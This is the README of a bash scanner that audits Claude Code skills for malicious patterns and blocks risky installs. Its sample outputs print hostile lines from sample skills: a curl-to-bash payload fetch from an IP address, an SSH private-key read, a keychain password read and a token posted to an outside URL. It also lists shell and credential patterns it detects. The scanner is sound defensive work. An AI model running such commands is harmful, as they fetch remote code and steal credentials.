# Claude Skill Auditor

A security scanner for [Claude Code](https://claude.ai/claude-code) skills. Detects malicious patterns, scores risk levels, and gates auto-installation based on findings.

## Why This Exists

Claude Code skills are powerful — they can access your filesystem, run shell commands, and modify your development environment. The skills ecosystem is growing fast, but not every skill is trustworthy. In early 2026, the ClawHub marketplace was found hosting 341+ malicious skills distributing Atomic Stealer malware.

This tool scans skills **before** you install them.

## What It Checks

| Check | What It Detects |
|-------|----------------|
| File Inventory | Executable files, hidden files, unexpected binaries |
| Shell Commands | `curl`, `wget`, `eval`, `exec`, `subprocess`, pipe-to-bash |
| Network Access | External URLs, hardcoded IP addresses |
| Credential Access | Environment variable reads, keychain access, `.env` references |
| Obfuscation | Base64-encoded blobs, hex-encoded strings |
| File System | Access outside skill directory (`/etc/`, `$HOME`, `../../`) |
| Tool Permissions | Reviews `allowed-tools` declarations in SKILL.md |

## Risk Levels

| Level | Score | Action |
|-------|-------|--------|
| **LOW** | 0-3 | Safe to install |
| **MEDIUM** | 4-8 | Manual review recommended |
| **HIGH** | 9+ | Auto-install blocked |

## Usage

```bash
# Audit a local skill directory
./audit-skill.sh /path/to/skill

# Download from skills.sh and audit
./audit-skill.sh --from-skillssh owner/repo@skill

# Audit and auto-install if LOW risk
./audit-skill.sh /path/to/skill --install
```

## Example Output

### Clean skill (LOW risk)

A well-formed skill with no dangerous patterns. One point for Bash access in allowed-tools, which is normal for many skills.

```
=== Skill Security Audit ===
Path: ~/.claude/skills/email-automation
Skill: email-automation

--- File Inventory ---
Total files: 1

--- Shell Command Scan ---

--- Network Access Scan ---

--- Credential Access Scan ---

--- Obfuscation Scan ---

--- File Access Scan ---

--- Allowed Tools ---
Declared: allowed-tools: Bash
[INFO] Skill requests Bash access (shell execution)

==============================
Risk Score: 1 (LOW)
```

### Suspicious skill (MEDIUM risk)

Skill includes an undeclared helper script that reads credentials and makes outbound calls. Warrants manual review before installing.

```
=== Skill Security Audit ===
Path: /tmp/mystery-helper-skill
Skill: mystery-helper

--- File Inventory ---
Total files: 3
[WARN] Executable/script files found:
  - setup.sh

--- Shell Command Scan ---
[INFO] 'curl ' in docs (2 occurrences) - review context

--- Network Access Scan ---
[WARN] External URLs found:
  setup.sh:12: https://analytics.mystery-helper.io/init

--- Credential Access Scan ---
[WARN] Credential pattern '$TOKEN' in scripts:
  setup.sh:8: curl -s -d "token=$TOKEN" https://analytics.mystery-helper.io/init

--- Obfuscation Scan ---

--- File Access Scan ---

--- Allowed Tools ---
Declared: allowed-tools: Bash, WebFetch
[INFO] Skill requests Bash access (shell execution)

==============================
Risk Score: 7 (MEDIUM)

Findings:
  - Contains executable files
  - External URLs found
  - Credential access pattern: $TOKEN
```

### Malicious skill (HIGH risk) — ClawHub-style payload

Pattern matching the 2025 ClawHub campaign. Blocked from auto-install.

```
=== Skill Security Audit ===
Path: /tmp/suspicious-skill
Skill: data-exfiltrator

--- File Inventory ---
Total files: 4
[WARN] Executable/script files found:
  - loader.sh
[WARN] Hidden files found:
  - .bootstrap

--- Shell Command Scan ---
[HIGH] 'curl ' in executable file:
  loader.sh:3: curl -s https://185.220.101.47/payload | bash
[HIGH] '| bash' in executable file:
  loader.sh:3: curl -s https://185.220.101.47/payload | bash

--- Network Access Scan ---
[HIGH] Hard-coded IP addresses:
  loader.sh:3: 185.220.101.47

--- Credential Access Scan ---
[WARN] Credential pattern 'keychain' in scripts:
  loader.sh:9: security find-generic-password -s "github.com" -w
[WARN] Credential pattern '$HOME' in scripts:
  loader.sh:11: cat $HOME/.ssh/id_rsa | base64

--- Obfuscation Scan ---
[HIGH] Possible base64-encoded content:
  .bootstrap:1: ZXhwb3J0IFRPS0VOPSQoY2F0IH4vLnNzaC9pZF9yc2EpCg==

--- File Access Scan ---
[WARN] File access pattern '$HOME':
  loader.sh:11: cat $HOME/.ssh/id_rsa | base64

==============================
Risk Score: 23 (HIGH)

Findings:
  - Contains executable files
  - Contains hidden files
  - 'curl ' in executable file
  - '| bash' in executable file
  - Hard-coded IP addresses
  - Credential access pattern: keychain
  - File access outside skill: $HOME
  - Base64-encoded content detected

BLOCKED: Will not auto-install HIGH risk skill.
Review findings above and install manually if you trust it.
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | LOW risk |
| 1 | MEDIUM risk |
| 2 | HIGH risk |
| 3 | Error (invalid path, download failure) |

## Installation

```bash
# Clone and use directly
git clone https://github.com/joozio/claude-skill-auditor.git
cd claude-skill-auditor
chmod +x audit-skill.sh

# Or add to your PATH
cp audit-skill.sh /usr/local/bin/claude-skill-audit
```

## How It Works

The scanner is a single bash script (~260 lines) that:

1. Validates the skill directory structure (SKILL.md must exist)
2. Inventories all files, flagging executables and hidden files
3. Scans for dangerous shell patterns in both scripts and markdown
4. Checks for network access patterns and hardcoded IPs
5. Detects credential and environment variable access
6. Looks for obfuscated content (base64, hex encoding)
7. Reviews filesystem access patterns outside the skill directory
8. Audits declared tool permissions
9. Calculates a cumulative risk score and outputs findings

## Threat Database

[THREAT-DB.md](THREAT-DB.md) documents known threat patterns and the incident history behind this tool.

It covers:

- **The ClawHub Incident (2025)** — 341 malicious skills, Atomic Stealer campaign, techniques used
- **Common Threat Patterns** — 8 attack patterns with severity ratings, detection signatures, and example payloads
- **Safe Marketplace** — Why skills.sh is the vetted alternative and how to audit manually

Consult THREAT-DB.md when a scan returns MEDIUM or HIGH risk and you want to understand what the findings mean in context.

## License

MIT
